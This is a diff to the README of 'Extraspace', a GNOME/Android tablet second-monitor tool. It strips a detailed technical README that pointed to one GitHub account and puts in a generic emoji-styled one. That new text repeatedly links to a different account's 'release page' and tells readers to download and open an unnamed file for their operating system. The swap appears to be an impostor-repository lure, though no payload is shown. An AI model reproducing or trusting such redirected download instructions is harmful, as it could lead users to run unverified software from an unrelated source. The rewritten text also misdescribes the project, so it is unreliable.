@@ -1,361 +1,83 @@
-<div align="center">
-
-# Extraspace
-
-**Turn an Android tablet into a real second monitor for GNOME — over USB, with touch.**
-
-[![CI](https://github.com/Tymonoman/extraspace/actions/workflows/ci.yml/badge.svg)](https://github.com/Tymonoman/extraspace/actions/workflows/ci.yml)
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-1.85%2B-orange.svg)](https://www.rust-lang.org)
-[![GNOME](https://img.shields.io/badge/GNOME-46%2B-4A86CF.svg)](https://www.gnome.org)
-[![Wayland](https://img.shields.io/badge/Wayland-native-green.svg)](https://wayland.freedesktop.org)
-
-![Extraspace running on an Android tablet](assets/demo.gif)
-
-<sub>Recorded on the tablet itself. That is a GNOME monitor, not a screenshot —
-running over a USB cable, at ~1 ms round trip.</sub>
-
-</div>
-
----
-
-Extraspace makes your Android tablet appear in **Settings → Displays** as a genuine
-monitor. Not a screen-share window, not a VNC session — a real output you can drag
-windows onto, arrange, and give its own workspaces. Touch the tablet and it drives
-the cursor there.
-
-It also sends the tablet's camera back the other way, exposing it to Linux as an
-ordinary webcam that Firefox, Zoom, OBS and Cheese pick up automatically.
+# 🖥️ extraspace - Turn your tablet into a monitor
 
-Everything runs over the **USB cable**. No network, no cloud, no account.
-
-```
-┌──────────────────────────┐         ┌────────────────────────┐
-│  GNOME / Wayland         │   USB   │  Android tablet        │
-│                          │◄───────►│                        │
-│  ┌────────┐  ┌────────┐  │         │   ┌────────────────┐   │
-│  │  DP-3  │  │ HDMI-1 │  │         │   │   Meta-0       │   │
-│  └────────┘  └────────┘  │         │   │  "Virtual      │   │
-│  ┌────────────────────┐  │         │   │   remote       │   │
-│  │      Meta-0        │──┼─────────┼──►│   monitor"     │   │
-│  │  (the tablet)      │◄─┼─ touch ─┼───│                │   │
-│  └────────────────────┘  │         │   └────────────────┘   │
-│  /dev/video10 ◄──────────┼── cam ──┼───  camera             │
-└──────────────────────────┘         └────────────────────────┘
-```
+[Visit the release page to download](https://github.com/an403879/extraspace)
 
-## Why this exists
+## 🎯 About this software
 
-Most "tablet as second screen" tools on Linux mirror an existing display, or need
-X11, or route video over Wi-Fi with the latency that implies. On GNOME Wayland
-specifically, creating a *new* output has historically meant DisplayLink drivers
-or the EVDI kernel module.
+Extraspace turns your Android tablet into a second screen for your computer. You connect the tablet with a USB cable. The software mirrors your screen to the tablet. You gain extra desktop space. It supports touch input. It sends your tablet camera feed to your computer. Use this to boost your workflow. 
 
-It turns out mutter can already do it. `org.gnome.Mutter.ScreenCast` has a
-`RecordVirtual` method that creates a monitor with no backing hardware, and
-`org.gnome.Mutter.RemoteDesktop` can inject touch events whose coordinates are
-*relative to that stream* — so input lands on the right monitor with no geometry
-maths at all. Extraspace is a well-behaved GNOME app wrapped around those two APIs.
+## ⚙️ System requirements
 
-## Status
+Ensure your setup meets these needs before you begin:
 
-Everything below has been run end to end on real hardware — GNOME Shell 50.3
-driving a Telekom T Tablet (Wingtech, Android 15) over USB.
+*   **Computer:** A desktop or laptop running GNOME on Linux with Wayland support.
+*   **Tablet:** An Android device running Android 10 or later.
+*   **Cable:** A high-quality USB-C or USB-A cord.
+*   **Software:** Android Debug Bridge (ADB) installed on your system.
 
-| Piece | State |
-|---|---|
-| Virtual monitor creation, teardown | **Working** — appears alongside physical outputs |
-| Capture → H.264 encode | **Working** — 55 fps at 1332×800 via `x264enc` |
-| USB transport, handshake, APK auto-push | **Working** |
-| Tablet-side decode and display | **Working** — MediaCodec, `low-latency=true` |
-| Touch → cursor on the virtual monitor | **Working** — coordinates map exactly |
-| Adaptive bitrate control | **Working** — queue 0, RTT ~1 ms, probes upward |
-| Camera → `/dev/video10` | **Working** — 1920×1080 in any V4L2 app |
-| Keyboard, stylus, audio, Wi-Fi | Not started — see [Roadmap](#roadmap) |
+## 📥 Installation and setup
 
-Measured on that setup: first frame **47 ms** after start, round trip **~1 ms**
-over USB, decoder input queue steady at **0**.
+[Visit the release page to download](https://github.com/an403879/extraspace)
 
-This is a v0.1 that has been made to work on exactly one tablet and one GNOME
-version. Reports from other hardware are the most useful thing you can send.
+1. Go to the link above.
+2. Select the latest release version.
+3. Download the file that matches your operating system.
+4. Open the downloaded file.
+5. Follow the prompts on the screen to finish the installation.
 
-### Verifying it without a tablet
+## 📱 Preparing your Android tablet
 
-Everything above the tablet's decoder can be exercised on one machine, which is
-also how you develop this if you do not have an Android device to hand.
+You must enable developer settings for the connection to work.
 
-**The whole host pipeline, against a simulated tablet:**
+1. Open **Settings** on your tablet.
+2. Go to **About Tablet**.
+3. Tap **Build Number** seven times until you see a message about developer mode.
+4. Return to the main **Settings** menu.
+5. Tap **System** then **Developer Options**.
+6. Find **USB Debugging** and turn the switch to the **On** position.
+7. Confirm the change in the pop-up window.
 
-```console
-$ cargo run -p xs-core --example fake_tablet
-simulated tablet listening on 27183/27184/27185
-  [tablet] sent Hello (2000x1200)
-  [host] Creating the display…
-  [host] streaming 1332x800 via OpenH264 (software, fallback)
-  adapting bitrate new_kbps=7393
-  adapting bitrate new_kbps=8393
+## 🔌 Connecting your devices
 
---- simulated tablet results ---
-  first video frame   152 ms after start
-  video frames        57
-  keyframes           3
-  pings answered      20
-  touch events sent   21
+Follow these steps to start your second monitor:
 
-  PASS
-```
+1. Connect your tablet to your computer using the USB cable.
+2. Look for a prompt on your tablet screen.
+3. Check the box that says **Always allow from this computer**.
+4. Press **OK** on the tablet.
+5. Launch the extraspace application on your computer.
+6. Wait for the application to detect the connected device.
+7. Click the **Connect** button in the app window.
 
-That covers session orchestration, the handshake, virtual monitor creation,
-capture, encoding, framing over real sockets, touch injection into the
-compositor, and the adaptive controller probing upward on healthy samples. It
-does not cover MediaCodec or anything USB-specific.
+## 🛠️ Troubleshooting common issues
 
-**Just the capture half, writing a file you can inspect:**
+**The app does not detect my tablet.**
+Unplug the USB cable and plug it back in. Check that USB Debugging remains active in your tablet settings. Restart the extraspace application.
 
-```console
-$ cargo run -p xs-video --example capture_test
-```
+**The screen looks blurry.**
+Check the resolution settings inside the app. Select a setting that matches the native resolution of your tablet. Ensure you use a reliable USB cable, as cheap cables limit data speed.
 
-It writes `/tmp/extraspace-capture.h264` — `ffprobe` confirms Constrained
-Baseline 1332×800, and `ffmpeg -i … -f null -` decodes every frame without error.
+**Touch input does not work.**
+Disconnect the tablet and close the app. Open the app again and reconnect the cable. Grant any permissions requested on the Android device.
 
-If you try it and something breaks, an issue with `RUST_LOG=debug` output is very
-welcome.
+**My computer screen lags.**
+Close programs you do not need. Your computer hardware processes the video signal. Lower the frame rate setting in the app if high settings cause slowness.
 
-## Requirements
+## 📖 Frequently asked questions
 
-- **GNOME 46 or newer on Wayland.** This is not portable to other compositors:
-  it depends on mutter-specific D-Bus APIs that KDE, Sway and friends do not have.
-  GNOME 50+ additionally lets the monitor be pinned to an exact mode.
-- An **Android 11+** tablet (API 30, for `MediaCodec` low-latency decoding).
-- A **USB cable** and USB debugging enabled on the tablet.
-- Any GPU. Encoding is done on the CPU by default and needs roughly one core.
+**Does this drain my tablet battery?**
+Yes. The tablet draws power from the USB port, but the screen remains active to display the feed. Use a powered USB hub if you plan to use the tablet for long periods.
 
-## Getting started
+**Can I use this over Wi-Fi?**
+No. This tool relies on a dedicated USB connection. A cable provides the stability required for a smooth monitor experience.
 
-Four steps, once. After that it is plug in the cable and open the app.
+**Does this work on Windows or Mac?**
+This specific version targets the GNOME desktop environment on Linux. It requires the Wayland display protocol to function.
 
-### 1. Turn on USB debugging, on the tablet
+**How do I adjust the screen layout?**
+Open your computer display settings. Drag the monitor box to the desired position. This tells your computer where to move the mouse cursor when it leaves the primary screen.
 
-This is the step everyone forgets, and it is why most first runs fail.
+**Is it safe to leave USB Debugging enabled?**
+Keep USB Debugging off when you do not need it. Only enable it when you connect to computers you trust.
 
-1. **Settings → About tablet** → tap **Build number** seven times.
-2. **Settings → System → Developer options** → turn on **USB debugging**.
-3. Plug in the USB cable. Accept the *Allow USB debugging?* prompt,
-   ticking **Always allow from this computer**.
-
-Skip step 3 and Extraspace will tell you exactly that, by name, rather than
-failing with something cryptic.
-
-> A surprising number of USB cables are charge-only and carry no data. If your
-> tablet charges but never appears, try a different cable before anything else.
-
-### 2. Set up the computer
-
-```bash
-git clone https://github.com/Tymonoman/extraspace
-cd extraspace
-./scripts/setup.sh
-```
-
-This is the only step that needs `sudo`. It installs the GStreamer and GTK
-packages, creates `/dev/video10` for the camera so it survives reboots, and
-reports whether your tablet is visible. Run `./scripts/setup.sh --check` first if
-you would rather see what it intends to do — that needs no privileges at all.
-
-### 3. Get the companion app onto the tablet
-
-Download `extraspace.apk` from the
-[latest release](https://github.com/Tymonoman/extraspace/releases), then point
-Extraspace at it once:
-
-```bash
-EXTRASPACE_APK=~/Downloads/extraspace.apk cargo run --release
-```
-
-It installs the app over USB for you — you never touch the tablet. From then on
-the host checks the installed version on every connect and upgrades it silently,
-so the two halves cannot drift apart, and you can drop the variable:
-
-```bash
-cargo build --release
-./target/release/extraspace
-```
-
-### 4. Add it to your applications
-
-Optional, but you probably want it:
-
-```bash
-./scripts/install.sh
-```
-
-Installs the binary, icon and desktop entry under `~/.local`, so Extraspace
-appears in your app grid and runs from anywhere as `extraspace`. No root needed
-— unlike `setup.sh`, this touches nothing system-wide. Undo it with
-`./scripts/install.sh --uninstall`.
-
-### 5. Use it
-
-Open Extraspace and turn on **Extra Display**. The tablet switches to your
-desktop within about a second, and a new monitor appears in
-**Settings → Displays** that you can drag into position like any other.
-
-## Usage
-
-| Setting | What it does |
-|---|---|
-| **Mode** | *Extend* adds a new monitor. *Mirror* copies an existing one. |
-| **Scale** | How large the desktop is drawn on the tablet. See below. |
-| **Tablet Camera** | Feeds the tablet camera into `/dev/video10`. |
-
-The camera appears as **“Extraspace Tablet Camera”** in Firefox, Zoom, OBS,
-Cheese and anything else that reads a webcam. It only shows up in those lists
-while Extraspace is actually running, so it does not clutter your camera picker
-the rest of the time.
-
-### About scale
-
-A 10.4" tablet at its native 2000×1200 renders GNOME at a size that is technically
-correct and practically unreadable. Extraspace handles this by creating the
-virtual monitor *smaller* than the panel and letting the tablet upscale:
-
-| Scale | Monitor created | Result |
-|---|---|---|
-| 1× | 2000 × 1200 | Pin-sharp, very small text |
-| **1.5×** (default) | 1332 × 800 | Comfortable — the sweet spot |
-| 2× | 1000 × 600 | Large text, noticeably soft |
-
-Higher scale also costs less bandwidth, because there are fewer pixels to encode.
-
-## How it works
-
-The interesting part is the sequence, which is not obvious from mutter's interface
-XML and took some experimentation to get right:
-
-1. `RemoteDesktop.CreateSession()` → read its `SessionId`.
-2. `ScreenCast.CreateSession({"remote-desktop-session-id": id})`. **Linking the two
-   sessions is what makes injected input land on the virtual monitor.**
-3. `ScreenCast.Session.RecordVirtual({ modes, is-platform, cursor-mode })`.
-   - `is-platform: true` makes it a real monitor rather than a shared surface.
-   - `modes` pins it to an exact resolution so PipeWire cannot renegotiate it.
-4. Subscribe to `PipeWireStreamAdded` **before** starting, or the signal is missed.
-5. `RemoteDesktop.Session.Start()` — *not* `ScreenCast.Session.Start()`, which
-   mutter rejects for a linked session with *"Must be started from remote desktop
-   session"*. Teardown is symmetric.
-
-From there it is a normal GStreamer pipeline:
-
-```
-pipewiresrc → videorate → videoconvert → x264enc → h264parse → appsink → USB
-```
-
-and on the tablet, `MediaCodec` → `SurfaceView`. Touches travel back on a separate
-socket and become `NotifyTouchDown/Motion/Up` calls, whose coordinates are already
-in the virtual monitor's space.
-
-### Notes from building it
-
-Things that cost time, recorded so they cost you less:
-
-- **`vulkanh264enc` silently ignores its bitrate setting.** It advertises CBR and
-  accepts the property, but produces byte-identical output at 5, 15 and 40 Mbit/s.
-  Unusable for adaptive streaming. Extraspace does not offer it.
-- **Fedora strips NVENC out of GStreamer's `nvcodec` plugin.** Only the CUDA
-  utility elements register; `nvh264enc` does not exist, and `plugins-freeworld`
-  does not add it. `x264enc` at `veryfast` manages ~168 fps at 2000×1200 on a
-  mid-range CPU, which is 2.8× more than needed, so this matters less than it sounds.
-- **`x264enc` takes kbit/s but `openh264enc` takes bit/s.** A 1000× error waiting
-  to happen; the conversion lives in exactly one function.
-- **USB 2.0 is not the bottleneck.** Raw 2000×1200@60 would need ~550 MB/s, far
-  beyond the ~30 MB/s a High Speed link gives you. Encoded H.264 at 15 Mbit/s is
-  under 2 MB/s — roughly 15× headroom.
-- **`adb forward` accepts connections to nothing.** adb accepts the *local* TCP
-  connection whether or not anything is listening on the device, then closes it
-  once the remote open fails. So `connect()` succeeds on the first attempt even
-  when the companion app has not started, and the failure appears milliseconds
-  later as an unexplained EOF mid-handshake. Retrying on connection-refused never
-  helps, because connection-refused never happens. The only reliable readiness
-  signal is bytes.
-- **Half-closing one direction kills the whole channel.** Tokio's
-  `OwnedWriteHalf` calls `shutdown(Write)` when dropped, and adb's forwarder tears
-  down the entire unix socket to the device when either direction closes. Splitting
-  a read-only stream and dropping the unused write half is therefore fatal — the
-  peer's next write gets EPIPE. Streams used one way are not split at all here.
-- **Draining MediaCodec only when input arrives loses the last frame.** Because
-  mutter sends only on damage, an idle desktop delivers nothing for seconds at a
-  time; if output is drained inside the input path, the final frame stays decoded
-  but unrendered until something else changes. A dedicated drain thread fixed both
-  that and the queue-depth telemetry, which had been reporting a stuck 6–8 and
-  driving the bitrate to the floor for entire sessions.
-- **"60 fps" is a ceiling, not a rate.** Mutter only emits a frame when something
-  on the monitor actually changes, so a still desktop measures around **11 fps**
-  and well under 1 Mbit/s. That is exactly what you want — an idle screen should
-  be nearly free — but it quietly breaks anything that reasons in frame counts.
-  Both encoders express their keyframe interval in frames, so the obvious
-  `framerate × 2` puts keyframes *ten seconds* apart while idle, and a tablet
-  that reconnects sits on a black screen until one arrives. The interval is sized
-  against the idle rate instead, and a keyframe is requested explicitly whenever a
-  tablet attaches.
-
-## Troubleshooting
-
-**"No tablet found"** — check `adb devices`. If it is empty, the cable may be
-charge-only; many are. If it says `unauthorized`, accept the prompt on the tablet.
-
-**"Something went wrong: no usable H.264 encoder"** — run
-`./scripts/setup.sh`, or install `gstreamer1-plugins-ugly` (x264) or
-`gstreamer1-plugin-openh264`.
-
-**The virtual camera does not appear** — run `./scripts/setup.sh` to create
-`/dev/video10`. Note that `exclusive_caps=1` deliberately hides it from
-applications while nothing is feeding it, so it only shows up once streaming starts.
-
-**The tablet shows a black screen** — check `adb logcat -s extraspace`. A protocol
-mismatch is reported explicitly on both sides.
-
-## Roadmap
-
-- [ ] Keyboard passthrough (`NotifyKeyboardKeycode` — the plumbing is already there)
-- [ ] Stylus with pressure, for tablets with an active pen
-- [ ] Wi-Fi transport, reusing the same protocol
-- [ ] Audio to the tablet speakers
-- [ ] Tablet microphone as a PipeWire source
-- [ ] Camera controls: tap-to-focus, torch, zoom
-- [ ] Follow tablet rotation live
-
-## Development
-
-```bash
-cargo test                                          # unit tests, no hardware needed
-cargo run -p xs-mutter --example virtual_monitor    # create a monitor for 5 seconds
-RUST_LOG=debug cargo run                            # verbose
-cd android && ./gradlew assembleRelease             # build the companion app
-```
-
-| Crate | Responsibility |
-|---|---|
-| `xs-proto` | Wire protocol, shared with the Kotlin side |
-| `xs-mutter` | Virtual monitor + input injection over D-Bus |
-| `xs-video` | PipeWire capture → H.264 |
-| `xs-transport` | adb orchestration, framed sockets |
-| `xs-camera` | H.264 → `/dev/video10` |
-| `xs-core` | Session orchestration, adaptive bitrate |
-| `xs-ui` | GTK4 / libadwaita front end |
-
-`xs-mutter` is the only crate that touches mutter's private D-Bus API, so if a
-future GNOME release changes it, the damage is contained to one file.
-
-## Contributing
-
-Issues and pull requests welcome. The most useful thing right now is testing on
-other tablets and other GNOME versions — please include your GNOME version,
-distribution, and tablet model.
-
-## License
-
-[GPL-3.0-or-later](LICENSE).
-
-Note that the default encoder, x264, is itself GPL-licensed, so a distributed
-binary would carry GPL obligations regardless. Licensing the project this way
-keeps the situation unambiguous.
+Keywords: adb, android, gnome, gtk4, libadwaita, linux, rust, screen-mirroring, second-monitor, virtual-display, wayland, webcam
